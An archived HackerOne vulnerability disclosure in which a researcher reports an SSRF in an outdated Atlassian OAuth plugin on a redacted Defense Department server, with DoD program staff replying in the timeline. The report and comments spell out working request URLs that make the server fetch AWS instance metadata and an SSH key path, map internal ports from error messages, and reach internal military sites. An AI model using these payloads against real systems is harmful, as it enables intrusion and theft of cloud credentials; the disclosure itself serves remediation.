---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-disclosure
  - env/web
  - vuln/xss
  - vuln/ssrf
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2019-10-08
submitted: 2018-03-15T03:41:47.205Z
bounty_usd: null
votes: 23
cve: "CVE-2017-9506"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "alyssa_herrera"
source: "https://hackerone.com/reports/326040"
title: "SSRF on █████████ Allowing internal server data access"
---
# SSRF on █████████ Allowing internal server data access

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 23 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/326040](https://hackerone.com/reports/326040)
- CWE: Information Disclosure | CVE: CVE-2017-9506
- Submitted: 2018-03-15T03:41:47.205Z

## Report summary

I discovered that due to an outdated atlassian software instance, I was able to exploit an SSRF vulnerability in confluence and was able to perform several actions such as bypass any firewall/protection solutions, was able to perform XSPA through assessing the response times for ports, access Internal DoD Servers and internal services.

I discuss the vulnerabilities exploited in my write which you can find here, https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
An end point on ██████ allows an internal access to the network thus revealing sensitive data and allowing internal tunneling 
**Description:**
OAuth Plugin allows you to provide a url that gives a snap shot of the web page. We can pass internal URLS and conduct SSRF.
## Impact
Critical
## Step-by-step Reproduction Instructions
https://███████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/hostname
We can see the follow data 
ip-172-31-12-254.█████████.compute.internal
https://████████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4
███████

## Product, Version, and Configuration (If applicable)
Jira 
## Suggested Mitigation/Remediation Actions
Update to recent version

## Impact

An attacker can tunnel into internal networks and access sensitive internal data such as AWS meta data information.

The hacker selected the **Server-Side Request Forgery (SSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Can internal services be reached bypassing network access control?**
Yes

**What internal services were accessible?**
AWS Bucket  Meta data

**Security Impact**
CVE-2017-9506 - The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF).

## Timeline

- **Report Filed**
- **2018-03-15** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Title Updated**
- **Report Severity Updated**
- **Report Triaged**
- **2018-03-15** @alyssa_herrera: I do know for the fact that when you're able to access the aws internal end points we can intact access the credentials and private information regarding the aws buckets.  I'm going to see if I might be possible to bypass the initial error I got preventing that from occurring to increase severity.  I also noticed that it tended to refuse trying to load mil domains /ips
- **2018-03-15** @ag3nt-j7: @alyssa_herrera Ok, keep us posted!
- **2018-03-15** @alyssa_herrera: Alright I found some interesting behavior that let's me port scan on the internal network.  
https://███/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:8080 
Gives us an error that says javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
Meaning that the internal ip exists. 
Same thing happens in port 80.
https://██████████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:21
We get this error 
org.apache.http.conn.HttpHostConnectException: Connect to 127.0.0.1:21 [/127.0.0.1] failed: Connection refused
Through these errors i'm able to perform an error-based enumeration of internal ports and checking if they exist.

I.e if we now do https://█████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://localhost:8080 we'll get connection timed out instead
https://███████/plugins/servlet/oauth/users/icon-uri?consumerUri=ldap://localhost:11211 We know that LDAP isn't supported on the server either now.
- **2018-03-15** @ag3nt-j7: @alyssa_herrera do you think this warrants another report or no?
- **2018-03-15** @alyssa_herrera: I don't think so, the root cause is the jira plugin allowing this which this report covers. If anything this should increase the severity as i'm able to prove that certain internal ports do exist. Additionally I was able to access mil sites through this as well
Such as  https://████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://██████/safe/
Though this ends up timing out 
https://█████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://█████████/
Which gives me this error
org.apache.http.conn.ConnectTimeoutException: Connect to ██████████:443 [████/█████████] failed: connect timed out

And sorry if I  end up tripping any alarms over this testing.
- **2018-03-15** @alyssa_herrera: I read into the documentation of the AWS meta data internal end point and found that I can leak more interesting information on the end point as well 
https://████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/document
Leaks this information

{
  "privateIp" : "█████",
  "instanceId" : "i-63914e47",
  "billingProducts" : [ "bp-6fa54006" ],
  "instanceType" : "t2.large",
  "accountId" : "993671966739",
  "imageId" : "ami-299e2248",
  "pendingTime" : "2016-07-22T22:52:20Z",
  "architecture" : "x86_64",
  "kernelId" : null,
  "ramdiskId" : null,
  "region" : "█████",
  "version" : "2010-08-31",
  "availabilityZone" : "███████a",
  "devpayProductCodes" : null
}

https://█████████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/pkcs7 and we can retrieve the PKCS7 signature here 


https://████████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/█████/owner-id We can find the owner ID here 993671966739 which is verifies the above ID leaking.


https://████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/█████████/security-groups "
Gives us██████████
HTTP
Devforce SSH
devforce_internal


I hope this proves the initial severity I marked it as
- **2018-03-15** @alyssa_herrera: So it seems I can tunnel into certain websites that appeared to be internal only or offer different functionality if it's coming from a DoD IP. Other mil sites I can access is https://█████████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://███/ 

https://████████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.██████/
Additionally websites that would give me SSL warnings or not matching SSL certificates or "Invalid certificate" like https://www.████████/  doesn't appear when I use this exploit to tunnel to them, example of this https://███████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.██████████/, leading me to believe this is using certificates or a solution that allows matches of the SSL certificates. Which leads me to believe that this server can indeed be used to access other internal networks not just the AWS meta data end point as I demonstrated but Mil servers as well. I did google to see if there's any publicly accessible information for any type of servers that were only accessible from the DoD and I did find two of them which I mentioned above. 
They are  https://████████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://███████/
 https://████/plugins/servlet/oauth/users/icon-uri?consumerUri=https://█████████/safe/
I can continue to attempt pivot or search for more information to prove the impact as it stands now, I feel the information that I provided is suffice enough to prove that we have the ability to A. Bypass any firewall/protection solutions B. Access AWS instance data C. Access Internal DoD Servers/Intranet  D. Reliably discover and enumerate Ports on the localhost
Thus based on these factors I can reasonably prove and back up my claim that we do in fact have a critical issue as intranet access to the DoD, the ability to enumerate AWS instance data and other points made above are severe enough that an attacker could reasonably use them to perform sophisticated and complex attacks on the DoD through pivoting into the DoD intranet infrastructure. Though I realize I might have inadvertently be able to access NIPERNET  if my understanding how the intranet of the DoD works.
- **2018-03-15** @alyssa_herrera: Various screen caps to demonstrate what should be seen and the information demonstrated. I'll now stop my testing, and allow you to review every thing
- **2018-03-16** @alyssa_herrera: I just noticed we can get SSH keys as well 
https://██████████/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **2018-03-16** @ag3nt-z3: @alyssa_herrera Congrats, you enumerated enough information that this is now a critical!
- **2018-03-16** @alyssa_herrera: Awesome to hear :)
- **2018-03-28** @alyssa_herrera: Hello, I  found another subdomain vulnerable to the exploit, should I make a separate for it ?
- **2018-03-29** @ag3nt-j7: @alyssa_herrera is it the same vulnerability?
- **2018-03-29** @alyssa_herrera: Yeah I noticed it was hosted on a separate subdomain,  and using different  instance, confluence instead of jira this time. I made I a new report for it as It seemed to affect another subdomain as well, I was unsure if it might be chalked up to root cause
- **2018-03-29** @ag3nt-j7: @alyssa_herrera ok, thank you for the detail.
- **2018-04-07** @alyssa_herrera: This end point is 404'ing now and does look like it's been updated
- **2018-04-09** @ag3nt-j7: @alyssa_herrera Thanks for the update.  We will contact the system owner and follow-up.
- **2018-04-10** @ag3nt-j1: @alyssa_herrera We heard about the blog post you published about this ticket and that you had to pull it, as per our guidelines.  However, no one here is pissed about it from the Director on down and we value all the good research you've put in so please keep at it!
- **2018-04-13** @alyssa_herrera: Alright sorry for jumping the gun.
- **Report Resolved**
- **Agreed On Going Public**
- **2018-08-11** @alyssa_herrera: Any update on disclosing this ?
- **2019-01-16** @alyssa_herrera: Just checking up to see when disclosure be given to this and the other reports of mine.
- **Agreed On Going Public**
- **Report Became Public**
- **2021-08-02** @agent-bk1: As a previous winner of Researcher of the Month we'd like to ask some questions to give you a voice in the program. If you have time we'd love your input. Thank you.

1.      Are you happy with the current point system of DoD VDP (7 points for
triage, 2 points for duplicate)?
2.      Are there any recommendations or suggestions you have for the
Researcher of the Month tweet?
3.      Are there any items in our policy that should be better defined for
participants?
4.      As an award winner, would you like to be interviewed and tell the
story of how you got into Vulnerability Disclosures and Bug Bounties?
5.      Did you use this program to "practice" before moving on to another?
6.      Are you happy with the level of communication you get from the
validators?
7.      It's been communicated that the researchers would like educational
opportunities with regards to the program, what types of opportunities would
you implement?
8.      What is the one thing you like most about our program?
9.      What is the one thing you like least about our program?
- **2021-08-03** @alyssa_herrera: 1. Yes.
2. No.
3. Procedure for handling Classified/sensitive rated data.
4. Yes
5. Yes, the varied scope, variety of assets and different types of systems provided a useful study on how different systems might be setup in live subsequently assisting in better vulnerability.
6. Yes, clear and concise about the steps being taken and investigator process being done. 
7. Unsure but I believe it's a good idea what ever you may implement 
8. Variety of scope clear communication and connection to the community
9. N./A
- **2021-08-04** @agent-bk1: Thank you very much for your feedback. I really appreciate you taking the time to answer.
